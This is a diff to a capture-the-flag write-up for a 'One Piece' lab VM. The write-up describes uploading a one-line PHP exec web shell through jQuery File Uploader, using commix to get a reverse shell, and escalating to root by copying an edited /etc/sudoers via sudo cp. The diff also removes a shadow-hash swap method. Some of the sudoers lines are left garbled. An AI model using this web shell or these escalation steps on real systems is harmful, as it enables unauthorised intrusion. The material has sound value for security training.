@@ -2,6 +2,9 @@
 
 One Piece CTF
 
+Download VM (OVA Template)
+https://drive.google.com/file/d/1EUZnLexBzcDPUeRhfV3POU_H-FV-Eksd/view?usp=sharing
+
 ## Vulnerabilities
 
 -   Apache2 Options +Indexes  
@@ -362,6 +365,11 @@ jQuery-File-Uploader
 
 ### Upload Shell Script
 
+The link below is a powerful web shell. You can upload this file directly via jQuery File Uploader.
+https://github.com/flozz/p0wny-shell/blob/master/shell.php
+
+Or, Manual mathod, One line of PHP code together with ```commix``` can open a reverse shell for you.
+
 shell.php
 ```
 <?php echo exec($_GET['cmd']) ?>;
@@ -378,7 +386,13 @@ python3 commix.py http://grandline.htb/jQuery-File-Uploader/server/php/files/she
 
 # Privilege Escalation
 
-Now, we have shell access. Let's walkthrough
+Now, we have shell access.
+
+You can use automated tools, by uploading one of these scripts in the link below.
+Run the script, wait for the scanning done.
+https://netsec.ws/?p=309&fbclid=IwAR0X9bFcC4VRO7CfMjsJRQEMzr19GcUXi_n3lUyfMy8Nv0Y3MdwyUEDOk9U
+
+Or Let's walkthrough manually.
 
 ```
 $ whoami
@@ -422,11 +436,7 @@ cp: Missing Operands
 
 [franky@ubuntu]$ pwd
 > /home/franky
-```
 
-### Method 1 - Patch /etc/sudoers
-
-```
 [franky@ubuntu]$ touch sudoers_Im_Coming
 [franky@ubuntu]$ sudo cp /etc/sudoers ~/sudoers_Im_Coming
 [franky@ubuntu]$ ls -l sudoers*
@@ -437,8 +447,8 @@ ViM screen
 ```
 
 ...
-root	ALL=(ALL:ALL)	ALL
-franky	ALL=(root)	:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
+root	ALL=(ALL:ALL)
+franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 ...
 
 
@@ -446,40 +456,7 @@ franky	ALL=(root)	:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 ```
 
 ```
-[franky@ubuntu]$ cp -f sudoers_Im_Coming /etc/sudoers
 [franky@ubuntu]$ sudo -s 
-[root@ubuntu]# 
-```
-
-
-### Method 2 - Patch /etc/shadow
-
-```
-[franky@ubuntu]$ touch my_shadow
-[franky@ubuntu]$ sudo cp /etc/shadow ~/my_shadow
-[franky@ubuntu]$ ls -l *shadow
-> rwxr-xr-x franky franky my_shadow
-[franky@ubuntu]$ vi my_shadow
-```
-
-ViM screen, Replace the hash of tester by franky's hash
-
-```
-tester:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17954:0:99999:7:::
-franky:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17949:0:99999:7:::
-```
-
-```
-[franky@ubuntu]$ cp -f my_shadow /etc/shadow
-[franky@ubuntu]$ su tester
-[tester@ubuntu]$ sudo -s
-Password: 3d2yhijinbe
-[root@ubuntu]# 
-```
-
-# I am ROOT !!
-
-```
 [root@ubuntu]# cd /root
 [root@ubuntu]# ls
 > rwx------		root	root	flag.txt
@@ -490,4 +467,3 @@ Password: 3d2yhijinbe
 ```
 Key=alabasta # Change it to whatever you like
 ```
-
